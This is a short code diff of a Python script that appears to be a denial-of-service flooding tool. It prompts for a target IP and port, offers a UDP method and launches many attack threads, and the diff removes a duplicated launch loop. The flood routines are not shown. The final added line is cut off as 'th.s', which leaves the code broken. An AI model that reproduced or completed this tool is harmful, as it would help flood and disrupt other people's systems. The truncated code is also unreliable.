@@ -14,7 +14,7 @@ print("Verification [ Phone IP ]")
 print("")
 
 time.sleep(3)
-os.system("cls")
+os.system("clear")
 print(" Seven Tools | Executive Present ")
 ip = str(input(" No Abuse | Targets :"))
 port = int(input(" No Abuse | Port :"))
@@ -56,12 +56,4 @@ for y in range(threads):
 		th.start()
 	else:
 		th = threading.Thread(target = run2)
-		th.start()
-		
-for y in range(methods):
-	if choice == 'UDP':
-		th = threading.Thread(target = run)
-		th.start()
-	else:
-		th = threading,Thread(target = run2)
-		th.start()
+		th.s
